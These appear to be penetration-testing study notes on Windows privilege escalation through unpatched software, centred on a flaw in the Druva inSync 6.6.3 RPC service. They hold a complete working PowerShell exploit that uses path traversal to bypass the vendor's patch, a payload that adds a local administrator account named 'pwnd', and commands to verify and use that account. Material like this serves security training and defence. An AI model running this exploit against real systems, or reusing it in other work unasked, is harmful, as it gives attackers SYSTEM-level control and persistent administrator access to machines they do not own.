#### **<mark style="background: #FF5582A6;">Unpatched Software</mark>:**

- **<mark style="background: #BBFABBA6;">Listing Installed Software</mark>:**
  - Use `wmic` tool to list installed software and versions.
  - May not return all installed programs, so check additional traces.

```cmd
# List installed software with versions
wmic product get name,version,vendor
```

- **<mark style="background: #BBFABBA6;">Exploitation Strategy</mark>:**
  - Search for exploits online on platforms like exploit-db, packet storm, or search engines.

```powershell
# Google search for vulnerabilities in installed software
site:exploit-db.com [SoftwareName] [Version] exploit
```

#### **<mark style="background: #FF5582A6;">Druva inSync 6.6.3 Exploit</mark>:**

- **<mark style="background: #BBFABBA6;">Vulnerability Overview</mark>:**
  - Vulnerable to privilege escalation.
  - RPC server on port 6064 with SYSTEM privileges (localhost only).
  - Procedure 5 allows executing any command.

- **<mark style="background: #BBFABBA6;">Original Vulnerability (6.5.0 and prior)</mark>:**
  - Allowed any command execution without restrictions.
  - Initially designed for remote execution of specific binaries.

- **<mark style="background: #BBFABBA6;">Patch (Ineffective)</mark>:**
  - Checked command start with "C:\ProgramData\Druva\inSync4\".
  - Path traversal attack bypassed this control.

- **<mark style="background: #BBFABBA6;">Exploitation Steps</mark>:**
  - Understand communication on port 6064 (hello, procedure 5, length, command).
  - Execute PowerShell exploit:

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

  - Change payload for desired action, e.g., adding a user with admin privileges.

```powershell
# Updated payload
$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"
```

- **<mark style="background: #BBFABBA6;">Verification after Exploitation</mark>:**
  - Confirm created user and group memberships:

```powershell
# Check user information
net user pwnd
```

  - Run command prompt as administrator:

```powershell
# Run Command Prompt as Pwnd
runas /user:pwnd "cmd.exe"
```